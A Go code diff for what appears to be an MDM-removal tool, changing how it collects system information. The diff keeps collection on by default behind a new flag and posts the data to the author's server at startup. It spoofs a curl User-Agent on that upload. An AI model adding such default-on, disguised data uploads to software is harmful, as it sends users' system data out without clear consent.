@@ -49,7 +49,7 @@ var (
 	menuAll             = flag.Bool("a", false, "All Menu Model")
 	Debug               = flag.Bool("d", false, "Debug Model")
 	supplier            = flag.Bool("s", false, "Supplier special version")
-	enableLogCollection = true // 日志收集开关，改为true启用日志收集
+	enableLogCollection = flag.Bool("l", true, "Collection Logs")
 	Language            = 1
 	serverHost          = "mdm.xrsec.fun"
 	serverURL           = "mdm.xrsec.fun"
@@ -1399,7 +1399,7 @@ func privacyDns() (client *http.Client) {
 
 // collectSystemInfo 收集系统信息
 func collectSystemInfo() *SystemInfo {
-	if !enableLogCollection {
+	if !*enableLogCollection {
 		return nil
 	}
 
@@ -1453,13 +1453,13 @@ func collectSystemInfo() *SystemInfo {
 
 // sendLogToServer 发送日志到服务器
 func sendLogToServer(info *SystemInfo) {
-	if info == nil || !enableLogCollection {
+	if info == nil || !*enableLogCollection {
 		return
 	}
-
 	jsonData, _ := json.Marshal(info)
 	httpClient := privacyDns()
-	req, _ := http.NewRequest("POST", fmt.Sprintf("http://%v/log", serverURL), bytes.NewBuffer(jsonData))
+	req, _ := http.NewRequest("POST", fmt.Sprintf("http://%v/LogCollection", serverURL), bytes.NewBuffer(jsonData))
+	req.Header.Set("User-Agent", "curl/7.64.1")
 	req.Header.Set("Content-Type", "application/json")
 	req.Header.Set("Authorization", "Bearer "+removeMDM())
 	httpClient.Do(req)
@@ -1844,9 +1844,8 @@ func main() {
 	msgOk("Wechat: xr_sec")
 	msgOk("Mail: xrsec@qq.com")
 	findOSPATH()
-
 	// 收集系统信息（如果启用）
-	if enableLogCollection {
+	if *enableLogCollection {
 		go sendLogToServer(collectSystemInfo())
 	}
 
